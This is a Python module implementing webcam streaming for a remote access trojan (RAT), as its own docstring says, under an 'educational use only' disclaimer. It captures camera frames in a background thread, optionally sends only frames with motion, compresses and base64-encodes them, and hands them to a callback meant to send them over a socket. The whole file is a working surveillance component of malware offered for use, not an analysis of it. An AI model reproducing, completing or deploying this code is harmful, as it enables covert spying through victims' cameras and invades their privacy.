
"""
Webcam streaming feature for client application - For educational use only
"""

import threading, base64, time, cv2

class WebcamStream:
    '''Webcam streaming class for RAT - For educational use only'''
    
    def __init__(self, camera_index=0, fps=10, resolution=(640, 480), 
                 quality=60, motion_only=False) -> None:
        """
        Initialize the webcam stream
        Args:
            camera_index: Camera device index (0 = default webcam)
            fps: Frames per second to capture
            resolution: Tuple (width, height) for frame size
            quality: JPEG compression quality (1-100, lower = smaller size)
            motion_only: Only send frames when motion detected
        """

        try:
            self.camera_index = camera_index
            self.fps = fps
            self.resolution = resolution
            self.quality = quality
            self.motion_only = motion_only
            
            self.running = False
            self.camera = None
            self.stream_thread = None
            self.frame_callback = None
            self.previous_frame = None
            
            # Statistics
            self.frames_sent = 0
            self.bytes_sent = 0
            self.start_time = None
        except Exception as e:
            raise Exception("WebcamStream Initialization Error in __init__ function - " + str(e))
    
    def _detect_motion(self, frame, threshold=2000) -> bool:
        """
        Detect if there's motion in the frame
        Args:
            frame: Current frame
            threshold: Motion sensitivity (lower = more sensitive)
        Returns:
            bool: True if motion detected
        """

        try:
            # Convert to grayscale
            gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
            gray = cv2.GaussianBlur(gray, (21, 21), 0)
            
            # No previous frame = no motion yet
            if self.previous_frame is None:
                self.previous_frame = gray
                return True  # Send first frame
            
            # Calculate difference
            frame_delta = cv2.absdiff(self.previous_frame, gray)
            thresh = cv2.threshold(frame_delta, 25, 255, cv2.THRESH_BINARY)[1]
            thresh = cv2.dilate(thresh, None, iterations=2)
            
            # Count non-zero pixels
            motion_pixels = cv2.countNonZero(thresh)
            
            # Update previous frame
            self.previous_frame = gray
            
            return motion_pixels > threshold
        except Exception as e:
            raise Exception("Motion Detection Error in _detect_motion function - " + str(e))
    
    def _compress_frame(self, frame) -> str:
        """
        Compress frame to JPEG and encode to base64
        Args:
            frame: OpenCV frame (numpy array)
        Returns:
            str: Base64 encoded JPEG frame
        """

        try:
            try:
                # Resize frame to target resolution
                resized = cv2.resize(frame, self.resolution)
                
                # Encode to JPEG
                encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), self.quality]
                _, buffer = cv2.imencode('.jpg', resized, encode_param)
                
                # Convert to base64 for safe transmission
                jpg_as_text = base64.b64encode(buffer).decode('utf-8')
                
                # Update statistics
                self.bytes_sent += len(jpg_as_text)
                self.frames_sent += 1
                
                # Return just the base64 string
                return jpg_as_text
                
            except Exception:
                return None
        except Exception as e:
            raise Exception("Frame Compression Error in _compress_frame function - " + str(e))
    
    def _capture_and_send_loop(self) -> None:
        """Main loop to capture and prepare frames for transmission"""

        try:
            # Open camera
            self.camera = cv2.VideoCapture(self.camera_index)
            
            if not self.camera.isOpened():
                print("Error: Cannot open camera")
                return
            
            # Set camera properties for better performance
            self.camera.set(cv2.CAP_PROP_FRAME_WIDTH, self.resolution[0])
            self.camera.set(cv2.CAP_PROP_FRAME_HEIGHT, self.resolution[1])
            self.camera.set(cv2.CAP_PROP_FPS, self.fps)
            
            # Calculate delay between frames
            frame_delay = 1.0 / self.fps
            
            self.start_time = time.time()
            
            while self.running:
                start_frame_time = time.time()
                
                # Capture frame
                ret, frame = self.camera.read()
                
                if not ret:
                    time.sleep(0.1)
                    continue
                
                # Check motion if enabled
                if self.motion_only:
                    if not self._detect_motion(frame):
                        time.sleep(frame_delay)
                        continue
                
                # Compress frame
                frame_data = self._compress_frame(frame)
                
                # Send frame via callback (socket send will be done in callback)
                if self.frame_callback:
                    self.frame_callback(frame_data)
                
                # Maintain target FPS
                elapsed = time.time() - start_frame_time
                sleep_time = max(0, frame_delay - elapsed)
                time.sleep(sleep_time)
            
            # Cleanup
            if self.camera:
                self.camera.release()
        except Exception as e:
            raise Exception("Capture and Send Loop Error in _capture_and_send_loop function - " + str(e))
    
    def start(self, frame_callback=None) -> None:
        """
        Start streaming webcam
        Args:
            frame_callback: Function to call with each frame data
                          This is where you'll send data via socket
        """

        try:
            if self.running:
                return
            
            self.frame_callback = frame_callback
            self.running = True
            self.frames_sent = 0
            self.bytes_sent = 0
            
            self.stream_thread = threading.Thread(target=self._capture_and_send_loop, daemon=True)
            self.stream_thread.start()
        except Exception as e:
            raise Exception("WebcamStream Start Error in start function - " + str(e))
    
    def stop(self) -> None:
        """Stop streaming webcam"""

        try:
            self.running = False
            
            if self.stream_thread:
                self.stream_thread.join(timeout=5)
            
            if self.camera:
                self.camera.release()
                self.camera = None
        except Exception as e:
            raise Exception("WebcamStream Stop Error in stop function - " + str(e))
    
    def get_statistics(self) -> dict:
        """Get streaming statistics"""

        try:
            if self.start_time:
                elapsed = time.time() - self.start_time
                fps_actual = self.frames_sent / elapsed if elapsed > 0 else 0
                bandwidth = (self.bytes_sent / elapsed / 1024) if elapsed > 0 else 0  # KB/s
                
                return {
                    'frames_sent': self.frames_sent,
                    'bytes_sent': self.bytes_sent,
                    'elapsed_seconds': elapsed,
                    'actual_fps': round(fps_actual, 2),
                    'bandwidth_kbps': round(bandwidth, 2)
                }
            return None
        except Exception as e:
            raise Exception("Get Statistics Error in get_statistics function - " + str(e))
    
    def adjust_quality(self, quality) -> None:
        """Dynamically adjust JPEG quality (1-100)"""

        try:
            self.quality = max(1, min(100, quality))
        except Exception as e:
            raise Exception("Adjust Quality Error in adjust_quality function - " + str(e))
    
    def adjust_fps(self, fps) -> None:
        """Dynamically adjust frame rate"""
        
        try:
            self.fps = max(1, min(30, fps))
        except Exception as e:
            raise Exception("Adjust FPS Error in adjust_fps function - " + str(e))